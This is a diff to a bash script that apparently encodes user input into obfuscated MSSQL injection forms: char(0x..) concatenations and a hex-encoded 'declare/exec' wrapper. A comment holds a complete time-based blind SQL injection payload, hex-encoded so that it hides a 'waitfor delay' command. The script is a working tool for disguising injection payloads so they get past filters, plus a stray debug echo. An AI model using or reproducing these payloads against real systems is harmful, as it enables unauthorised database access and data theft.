@@ -14,26 +14,6 @@ fi
 
 echo "You entered: $input"
 
-input=$1
-echo "mssql char:"
-i=0
-outbuf=''
-stringlength=${#input}
-((stringlengthminus1=$stringlength-1))
-while ((i<$stringlength)) ; do 
-	char=`echo "${input:i:1}"`
-	outbuf=$outbuf`echo -n "char(0x"`	
-	outbuf=$outbuf`printf "%x" "'$char'"`
-	if [[ "$i" -lt "$stringlengthminus1" ]] ; then
-		outbuf=$outbuf`echo -n ")+"`
-	fi
-	if [[ "$i" == "$stringlengthminus1" ]] ; then
-		outbuf=$outbuf`echo -n ")"`
-	fi
-	((i++))
-done 
-echo "$outbuf"
-
 echo "URL encoding:"
 i=0
 #input=$1
@@ -275,3 +255,41 @@ while ((i<$stringlength)) ; do
 	((i=$i+2))
 done 
 echo "$outbuf"	
+
+echo "asdasd"
+input=$1
+#1' declare @werui varchar(100) select @werui=0x77616974666f722064656c61792027303a303a323027 exec(@werui)--
+echo "MSSQL declare/exec/hex encoding:"
+i=0
+outbuf=''
+stringlength=${#input}
+((stringlengthminus1=$stringlength-1))
+while ((i<$stringlength)) ; do 
+	char=`echo "${input:i:1}"`
+	val=`printf "%02x" "'$char'"`
+	vallength=${#val}
+	outbuf=$outbuf`echo -n $val`
+	((i++))
+done 
+outbuf="declare @werui varchar(100) select @werui=0x$outbuf exec(@werui)"
+echo "$outbuf"
+
+input=$1
+echo "mssql char:"
+i=0
+outbuf=''
+stringlength=${#input}
+((stringlengthminus1=$stringlength-1))
+while ((i<$stringlength)) ; do 
+	char=`echo "${input:i:1}"`
+	outbuf=$outbuf`echo -n "char(0x"`	
+	outbuf=$outbuf`printf "%x" "'$char'"`
+	if [[ "$i" -lt "$stringlengthminus1" ]] ; then
+		outbuf=$outbuf`echo -n ")+"`
+	fi
+	if [[ "$i" == "$stringlengthminus1" ]] ; then
+		outbuf=$outbuf`echo -n ")"`
+	fi
+	((i++))
+done 
+echo "$outbuf"
